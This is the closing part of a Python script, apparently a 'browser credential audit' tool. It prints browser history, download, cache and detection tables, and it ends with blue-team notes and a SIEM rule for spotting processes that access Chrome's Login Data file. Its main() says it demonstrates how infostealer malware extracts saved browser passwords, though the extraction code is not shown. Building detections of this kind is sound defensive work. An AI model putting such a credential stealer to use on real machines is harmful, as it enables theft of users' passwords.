                filename = entry['filename'][:27] + "..." if len(entry['filename']) > 30 else entry['filename']
                size = entry['size']
                state = entry['state']
                
                start_time = entry['start_time'].strftime('%Y-%m-%d %H:%M:%S') if entry['start_time'] else 'Unknown'
                
                row = f"{url:<50} | {filename:<30} | {size:<12} | {state:<15} | {start_time:<20}"
                print(row)
            
            print(f"\n{'='*120}")
            print(f"Total Download Entries: {len(self.downloads)} (showing first 100)")
            print(f"{'='*120}\n")
        
        # Display cache files if requested
        if show_cache and self.cache_files:
            print(f"\n{'='*120}")
            print(f"CACHE FILES (HTML/CSS/JavaScript) - {self.browser_name}")
            print(f"{'='*120}\n")
            
            # Group by type
            html_files = [f for f in self.cache_files if f['type'] == 'HTML']
            css_files = [f for f in self.cache_files if f['type'] == 'CSS']
            js_files = [f for f in self.cache_files if f['type'] == 'JavaScript']
            
            print(f"HTML Files: {len(html_files)} | CSS Files: {len(css_files)} | JavaScript Files: {len(js_files)}\n")
            
            # Table header
            header = f"{'Filename':<40} | {'Type':<12} | {'Size':<12} | {'Modified':<20}"
            print(header)
            print("-" * 120)
            
            # Display each cache file
            for entry in self.cache_files[:100]:  # Show first 100
                filename = entry['filename'][:37] + "..." if len(entry['filename']) > 40 else entry['filename']
                file_type = entry['type']
                size = entry['size']
                modified = entry['modified'].strftime('%Y-%m-%d %H:%M:%S') if entry['modified'] else 'Unknown'
                
                row = f"{filename:<40} | {file_type:<12} | {size:<12} | {modified:<20}"
                print(row)
            
            print(f"\n{'='*120}")
            print(f"Total Cache Files: {len(self.cache_files)} (showing first 100)")
            print(f"{'='*120}\n")
        
        # Display downloaded files if requested
        if show_downloaded_files and self.downloaded_files:
            print(f"\n{'='*120}")
            print(f"DOWNLOADED FILES (Downloads Folder) - {self.browser_name}")
            print(f"{'='*120}\n")
            
            suspicious_count = sum(1 for f in self.downloaded_files if f.get('suspicious', False))
            print(f"Total Files: {len(self.downloaded_files)} | Suspicious: {suspicious_count}\n")
            
            # Table header
            header = f"{'Filename':<40} | {'Type':<15} | {'Size':<12} | {'Suspicious':<12} | {'Modified':<20}"
            print(header)
            print("-" * 120)
            
            # Display each downloaded file
            for entry in self.downloaded_files:
                filename = entry['filename'][:37] + "..." if len(entry['filename']) > 40 else entry['filename']
                file_type = entry['type']
                size = entry['size']
                suspicious = 'YES' if entry.get('suspicious', False) else 'NO'
                modified = entry['modified'].strftime('%Y-%m-%d %H:%M:%S') if entry['modified'] else 'Unknown'
                
                row = f"{filename:<40} | {file_type:<15} | {size:<12} | {suspicious:<12} | {modified:<20}"
                print(row)
                
                # Show indicators for suspicious files
                if entry.get('suspicious', False) and entry.get('indicators'):
                    print(f"  ⚠️  Indicators: {', '.join(entry['indicators'])}")
            
            print(f"\n{'='*120}")
            print(f"Total Downloaded Files: {len(self.downloaded_files)}")
            print(f"{'='*120}\n")
        
        # Display detection results if requested
        if show_detection and hasattr(self, 'detections') and self.detections:
            detections = self.detections
            print(f"\n{'='*120}")
            print(f"UNAUTHORIZED ACCESS DETECTION - {self.browser_name}")
            print(f"{'='*120}\n")
            
            risk_color = 'HIGH' if detections['risk_level'] == 'HIGH' else 'MEDIUM' if detections['risk_level'] == 'MEDIUM' else 'LOW'
            print(f"Overall Risk Level: {detections['risk_level']}")
            print(f"Unauthorized Access Patterns: {len(detections['unauthorized_access'])}")
            print(f"Suspicious Files: {len(detections['suspicious_files'])}")
            print(f"Threats Detected: {len(detections['threats'])}\n")
            
            if detections['unauthorized_access']:
                print("UNAUTHORIZED ACCESS DETECTED:")
                print("-" * 120)
                for access in detections['unauthorized_access']:
                    print(f"File: {access['file']}")
                    print(f"  Type: {access['type']}")
                    print(f"  Risk: {access['risk']}")
                    print(f"  Last Access: {access['last_access']}")
                    print(f"  Description: {access['description']}")
                    print()
            
            if detections['suspicious_files']:
                print("SUSPICIOUS FILES DETECTED:")
                print("-" * 120)
                for file in detections['suspicious_files'][:20]:  # Show first 20
                    print(f"File: {file['filename']}")
                    print(f"  Type: {file['type']}")
                    print(f"  Indicators: {', '.join(file.get('indicators', []))}")
                    print()
            
            if detections['threats']:
                print("THREATS DETECTED:")
                print("-" * 120)
                for threat in detections['threats']:
                    print(f"Type: {threat['type']}")
                    print(f"  Risk: {threat['risk']}")
                    print(f"  Description: {threat['description']}")
                    print()
            
            print(f"{'='*120}\n")


def main():
    """
    Main execution function.
    
    This demonstrates the complete attack chain for educational purposes.
    """
    # Set console encoding to UTF-8 for Windows
    import sys
    if sys.platform == 'win32':
        try:
            sys.stdout.reconfigure(encoding='utf-8')
        except:
            pass
    
    print("""
    ============================================================================
         Browser Credential Security Audit Tool
         For Blue Team Training & Security Posture Assessment
    ============================================================================
    
    [EDUCATIONAL USE ONLY]
    This tool demonstrates how modern infostealer malware extracts browser passwords.
    Use this for:
    - Security awareness training
    - Testing detection capabilities
    - Understanding attack vectors
    - Building defensive rules
    
    """)
    
    # List of supported browsers
    browsers = ['Chrome', 'Edge', 'Brave', 'Opera', 'Vivaldi']
    
    print("Available browsers:")
    for i, browser in enumerate(browsers, 1):
        print(f"  {i}. {browser}")
    
    # Get browser selection
    try:
        choice = input("\nSelect browser (1-5) or press Enter for Chrome: ").strip()
        if not choice:
            browser_name = 'Chrome'
        else:
            browser_name = browsers[int(choice) - 1]
    except (ValueError, IndexError):
        print("[INFO] Invalid selection, using Chrome")
        browser_name = 'Chrome'
    
    try:
        # Initialize auditor
        auditor = BrowserCredentialAuditor(browser_name=browser_name)
        
        # Ask if user wants history, downloads, cache, and detection
        include_history = input("\nInclude browser history? (y/n, default: n): ").strip().lower() == 'y'
        include_downloads = input("Include download history? (y/n, default: n): ").strip().lower() == 'y'
        include_cache = input("Include cache files (HTML/CSS/JS)? (y/n, default: n): ").strip().lower() == 'y'
        include_detection = input("Run unauthorized access detection? (y/n, default: y): ").strip().lower() != 'n'
        
        # Perform audit
        result = auditor.audit(
            include_history=include_history, 
            include_downloads=include_downloads,
            include_cache=include_cache,
            include_detection=include_detection
        )
        
        # Display results
        auditor.display_results(
            show_history=include_history, 
            show_downloads=include_downloads,
            show_cache=include_cache,
            show_downloaded_files=True,  # Always show downloaded files
            show_detection=include_detection
        )
        
        # Blue Team Training Notes
        print("""
    ============================================================================
                        BLUE TEAM TRAINING NOTES
    ============================================================================
    
    DETECTION OPPORTUNITIES:
    ------------------------
    1. File System Access:
       - Monitor access to: AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data
       - Alert on non-browser processes accessing this file
       
    2. Process Behavior:
       - Scripts accessing sqlite3.dll
       - Python processes reading browser data directories
       - Unusual file copy operations in browser directories
       
    3. API Calls:
       - CryptUnprotectData API calls from non-system processes
       - SQLite database queries on Login Data
       
    DEFENSIVE MEASURES:
    -------------------
    1. Use Password Managers: Bitwarden, 1Password, etc. (not browser storage)
    2. Enable Browser Sync Encryption: Use sync passphrase
    3. Monitor File Access: Use Process Monitor or EDR solutions
    4. Least Privilege: Don't run scripts with admin rights unnecessarily
    5. Application Whitelisting: Block unauthorized scripts
    
    DETECTION RULE EXAMPLE (SIEM):
    -------------------------------
    Event: File Access
    Path: *\\User Data\\Default\\Login Data
    Process: NOT IN (chrome.exe, msedge.exe, brave.exe)
    Action: ALERT HIGH SEVERITY
    
        """)
        
    except FileNotFoundError as e:
        print(f"\n[ERROR] {e}")
        print("\n[INFO] Possible reasons:")
        print("  - Browser not installed")
        print("  - No saved passwords in browser")
        print("  - Using a different browser profile")
        
    except PermissionError as e:
        print(f"\n[ERROR] {e}")
        print("\n[INFO] Solutions:")
        print("  - Close the browser completely")
        print("  - Run script as administrator")
        print("  - Check file permissions")
        
    except Exception as e:
        print(f"\n[ERROR] Unexpected error: {e}")
        print("\n[INFO] This may indicate:")
        print("  - Missing dependencies (pip install pycryptodome pypiwin32)")
        print("  - Corrupted browser data")
        print("  - Unsupported browser version")


if __name__ == "__main__":
    main()
